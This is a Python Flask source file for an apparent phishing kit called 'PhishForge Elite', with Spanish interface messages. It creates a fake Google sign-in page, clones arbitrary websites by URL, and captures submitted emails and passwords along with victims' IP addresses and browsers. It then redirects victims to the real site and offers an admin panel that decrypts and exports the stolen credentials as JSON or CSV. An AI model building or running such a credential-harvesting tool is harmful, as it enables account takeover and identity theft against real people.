from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, send_from_directory, session, Response
import sqlite3
import json
import os
import secrets
import csv
import io
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps

from phishforge.database import init_db, DB_FILE, get_db_connection
from phishforge.cloner import clone_site
from phishforge.phishforge_security import encrypt, decrypt

app = Flask(__name__, template_folder='phishforge/templates', static_folder='phishforge/static')
app.secret_key = secrets.token_hex(16)

def first_run_setup():
    """Creates necessary files, directories, and admin credentials on the first run."""
    try:
        os.makedirs("phishforge/cloned_sites", exist_ok=True)
        os.makedirs("phishforge/templates/predefined", exist_ok=True)

        if not os.path.exists(".gitignore"):
            gitignore_content = """# Python artifacts
__pycache__/
*.py[cod]
*.egg-info/
.env

# Virtual Environment
.venv
venv/
ENV/

# Database and secrets
*.db
*.sqlite3
secret.key

# Cloned sites (generated content)
phishforge/cloned_sites/

# OS-specific
.DS_Store
Thumbs.db
"""
            with open(".gitignore", "w") as f:
                f.write(gitignore_content)

        google_template_dir = "phishforge/templates/predefined/google"
        os.makedirs(google_template_dir, exist_ok=True)
        google_template_path = os.path.join(google_template_dir, "index.html")
        if not os.path.exists(google_template_path):
            google_template_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Login</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 360px; text-align: center; }
        .login-container img { width: 75px; margin-bottom: 20px; }
        .login-container h1 { font-size: 24px; margin-bottom: 20px; }
        .login-container input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .login-container button { width: 100%; padding: 10px; background-color: #4285F4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo">
        <h1>Sign in</h1>
        <form action="/capture/{{ campaign_name }}" method="post">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
"""
            with open(google_template_path, "w") as f:
                f.write(google_template_content)

        google_config_path = os.path.join(google_template_dir, "config.json")
        if not os.path.exists(google_config_path):
            google_config_content = {"redirect_url": "https://www.google.com"}
            with open(google_config_path, "w") as f:
                json.dump(google_config_content, f)

        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM admin")
            if cursor.fetchone() is None:
                username = "admin"
                password = secrets.token_urlsafe(12)
                password_hash = generate_password_hash(password)
                cursor.execute("INSERT INTO admin (id, username, password_hash) VALUES (1, ?, ?)", (username, password_hash))
                conn.commit()
                print("="*50)
                print(" PhishForge Elite - CREDENCIALES DE ADMINISTRADOR (GUARDAR EN LUGAR SEGURO)")
                print("="*50)
                print(f" Usuario: {username}")
                print(f" Contraseña: {password}")
                print("-"*50)
                print("¡Esta es la única vez que se mostrará la contraseña!")
                print("Si la pierdes, usa el script 'reset_admin_password.py' para recuperarla.")
                print("="*50)
            conn.close()
    except Exception as e:
        print(f"[ERROR] Error durante la configuración inicial: {e}")

init_db()
first_run_setup()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash("Por favor, inicia sesión para acceder a esta página.", "danger")
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        conn = get_db_connection()
        if conn:
            username = request.form['username']
            password = request.form['password']
            user = conn.execute("SELECT * FROM admin WHERE username = ?", (username,)).fetchone()
            conn.close()

            if user and check_password_hash(user['password_hash'], password):
                session['user_id'] = user['id']
                return redirect(url_for('dashboard'))
            else:
                flash("Usuario o contraseña incorrectos", "danger")
        else:
            flash("Error al conectar con la base de datos. Inténtalo de nuevo más tarde.", "danger")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("Has cerrado sesión correctamente.", "success")
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    conn = get_db_connection()
    if conn:
        data = conn.execute("SELECT c.name as campaign, cd.data, cd.ip_address, cd.captured_at FROM captured_data cd JOIN campaigns c ON c.id = cd.campaign_id ORDER BY cd.captured_at DESC").fetchall()
        conn.close()
        
        decrypted_data = []
        for item in data:
            item_dict = dict(item)
            try:
                item_dict['data'] = json.loads(decrypt(item['data']))
            except (json.JSONDecodeError, TypeError):
                item_dict['data'] = {"error": "No se pudo decodificar los datos."}
            decrypted_data.append(item_dict)

        return render_template('dashboard.html', data=decrypted_data)
    else:
        flash("Error al cargar el panel de control. Inténtalo de nuevo más tarde.", "danger")
        return render_template('dashboard.html', data=[])

@app.route('/campaigns')
@login_required
def campaigns():
    conn = get_db_connection()
    if conn:
        campaigns_query = """
        SELECT c.id, c.name, c.template_type, c.created_at, COUNT(cd.id) as capture_count
        FROM campaigns c
        LEFT JOIN captured_data cd ON c.id = cd.campaign_id
        GROUP BY c.id
        ORDER BY c.created_at DESC
        """
        campaigns = conn.execute(campaigns_query).fetchall()
        conn.close()
        
        predefined_templates = []
        try:
            for d in os.listdir('phishforge/templates/predefined'):
                full_path = os.path.join('phishforge/templates/predefined', d)
                if os.path.isdir(full_path):
                    predefined_templates.append(d)
        except OSError as e:
            flash(f"Error al leer las plantillas predefinidas: {e}", "danger")

        return render_template('campaigns.html', campaigns=campaigns, predefined_templates=predefined_templates)
    else:
        flash("Error al cargar las campañas. Inténtalo de nuevo más tarde.", "danger")
        return render_template('campaigns.html', campaigns=[], predefined_templates=[])

@app.route('/campaign/create', methods=['POST'])
@login_required
def create_campaign():
    conn = get_db_connection()
    if not conn:
        flash("Error al conectar con la base de datos. Inténtalo de nuevo más tarde.", "danger")
        return redirect(url_for('campaigns'))

    campaign_name = request.form['campaign_name']
    url = request.form.get('url')
    template = request.form.get('template')
    template_type = 'cloned' if url else template

    if not campaign_name:
        flash("El nombre de la campaña no puede estar vacío.", "danger")
        conn.close()
        return redirect(url_for('campaigns'))

    if not url and not template:
        flash("Debes proporcionar una URL para clonar o seleccionar una plantilla.", "danger")
        conn.close()
        return redirect(url_for('campaigns'))

    try:
        conn.execute("INSERT INTO campaigns (name, template_type, cloned_url) VALUES (?, ?, ?)", (campaign_name, template_type, url))
        conn.commit()
    except sqlite3.IntegrityError:
        flash(f'El nombre de campaña "{campaign_name}" ya existe.', 'danger')
        conn.close()
        return redirect(url_for('campaigns'))
    except sqlite3.Error as e:
        flash(f"Error al crear la campaña: {e}", "danger")
        conn.close()
        return redirect(url_for('campaigns'))
    finally:
        conn.close()

    if url:
        clone_result = clone_site(url, campaign_name)
        if "Error" in clone_result:
            flash(f"Error al clonar el sitio: {clone_result}", "danger")
            return redirect(url_for('campaigns'))

    flash(f'¡Campaña "{campaign_name}" creada con éxito!', 'success')
    return redirect(url_for('campaigns'))

@app.route('/campaign/delete/<int:campaign_id>')
@login_required
def delete_campaign(campaign_id):
    conn = get_db_connection()
    if not conn:
        flash("Error al conectar con la base de datos. Inténtalo de nuevo más tarde.", "danger")
        return redirect(url_for('campaigns'))

    try:
        campaign = conn.execute("SELECT name, template_type FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
        if not campaign:
            flash("Campaña no encontrada.", "danger")
            return redirect(url_for('campaigns'))

        conn.execute("DELETE FROM captured_data WHERE campaign_id = ?", (campaign_id,))
        conn.execute("DELETE FROM campaigns WHERE id = ?", (campaign_id,))
        conn.commit()
        conn.close()

        if campaign['template_type'] == 'cloned':
            file_path = os.path.join("phishforge", "cloned_sites", f"{campaign['name']}.html")
            if os.path.exists(file_path):
                os.remove(file_path)
        
        flash(f'Campaña "{campaign['name']}" y todos sus datos han sido eliminados.', 'success')

    except sqlite3.Error as e:
        flash(f"Error al eliminar la campaña: {e}", "danger")
    except OSError as e:
        flash(f"Error al eliminar el archivo clonado: {e}", "danger")
    finally:
        if conn:
            conn.close()

    return redirect(url_for('campaigns'))

@app.route('/campaign/<int:campaign_id>')
@login_required
def campaign_detail(campaign_id):
    conn = get_db_connection()
    if not conn:
        flash("Error al conectar con la base de datos. Inténtalo de nuevo más tarde.", "danger")
        return redirect(url_for('dashboard'))

    campaign = conn.execute("SELECT * FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
    data = conn.execute("SELECT * FROM captured_data WHERE campaign_id = ? ORDER BY captured_at DESC", (campaign_id,)).fetchall()
    conn.close()

    if not campaign:
        flash("Campaña no encontrada.", "danger")
        return redirect(url_for('dashboard'))

    decrypted_data = []
    for item in data:
        item_dict = dict(item)
        try:
            item_dict['data'] = json.loads(decrypt(item['data']))
        except (json.JSONDecodeError, TypeError):
            item_dict['data'] = {"error": "No se pudo decodificar los datos."}
        decrypted_data.append(item_dict)

    return render_template('campaign_detail.html', campaign=campaign, data=decrypted_data)

@app.route('/campaign/export/<int:campaign_id>/<format>')
@login_required
def export_data(campaign_id, format):
    conn = get_db_connection()
    if not conn:
        flash("Error al conectar con la base de datos. Inténtalo de nuevo más tarde.", "danger")
        return redirect(url_for('dashboard'))

    campaign = conn.execute("SELECT name FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
    data = conn.execute("SELECT * FROM captured_data WHERE campaign_id = ?", (campaign_id,)).fetchall()
    conn.close()

    if not campaign:
        flash("Campaña no encontrada.", "danger")
        return redirect(url_for('dashboard'))

    decrypted_data = []
    for item in data:
        item_dict = dict(item)
        try:
            item_dict['data'] = decrypt(item['data'])
        except Exception:
            item_dict['data'] = "[Datos ilegibles]"
        decrypted_data.append(item_dict)

    if format == 'json':
        return jsonify(decrypted_data)
    elif format == 'csv':
        output = io.StringIO()
        writer = csv.writer(output)
        
        writer.writerow(['id', 'campaign_id', 'data', 'ip_address', 'user_agent', 'captured_at'])
        
        for row in decrypted_data:
            writer.writerow([row['id'], row['campaign_id'], row['data'], row['ip_address'], row['user_agent'], row['captured_at']])
        
        output.seek(0)
        return Response(output, mimetype="text/csv", headers={"Content-Disposition": f"attachment;filename={campaign['name']}_export.csv"})

    flash("Formato de exportación no válido.", "danger")
    return redirect(url_for('campaign_detail', campaign_id=campaign_id))

@app.route('/site/<campaign_name>')
def serve_site(campaign_name):
    conn = get_db_connection()
    if not conn:
        return "Error interno del servidor", 500

    campaign = conn.execute("SELECT template_type FROM campaigns WHERE name = ?", (campaign_name,)).fetchone()
    conn.close()

    if not campaign:
        return "Campaña no encontrada", 404

    if campaign['template_type'] == 'cloned':
        cloned_path = os.path.join('phishforge', 'cloned_sites', f"{campaign_name}.html")
        if os.path.exists(cloned_path):
            return send_from_directory(os.path.join('phishforge', 'cloned_sites'), f"{campaign_name}.html")
        else:
            return "Sitio clonado no encontrado", 404
    else:
        template_dir = os.path.join('phishforge', 'templates', 'predefined', campaign['template_type'])
        template_file = os.path.join(template_dir, 'index.html')
        if os.path.exists(template_file):
            return render_template(f"predefined/{campaign['template_type']}/index.html", campaign_name=campaign_name)
        else:
            return "Plantilla predefinida no encontrada", 404

@app.route('/capture/<campaign_name>', methods=['POST'])
def capture(campaign_name):
    conn = get_db_connection()
    if not conn:
        return "Error interno del servidor", 500

    campaign = conn.execute("SELECT id, template_type, cloned_url FROM campaigns WHERE name = ?", (campaign_name,)).fetchone()
    if not campaign:
        return "Campaña no encontrada", 404

    data = json.dumps(request.form.to_dict())
    encrypted_data = encrypt(data)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    try:
        conn.execute("INSERT INTO captured_data (campaign_id, data, ip_address, user_agent) VALUES (?, ?, ?, ?)",
                     (campaign['id'], encrypted_data, ip_address, user_agent))
        conn.commit()
    except sqlite3.Error as e:
        print(f"[ERROR] Error al guardar datos capturados: {e}")
        return "Error interno del servidor", 500
    finally:
        conn.close()

    if campaign['template_type'] == 'cloned':
        if campaign['cloned_url']:
            return redirect(campaign['cloned_url'])
        else:
            return "<h1>¡Gracias!</h1><p>Tu información ha sido enviada.</p>"
    else:
        config_path = os.path.join('phishforge', 'templates', 'predefined', campaign['template_type'], 'config.json')
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
                redirect_url = config.get('redirect_url', url_for('dashboard'))
                return redirect(redirect_url)
        except (FileNotFoundError, json.JSONDecodeError):
            print(f"[ADVERTENCIA] config.json no encontrado o inválido para la plantilla {campaign['template_type']}. Redirigiendo al dashboard.")
            return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(debug=True)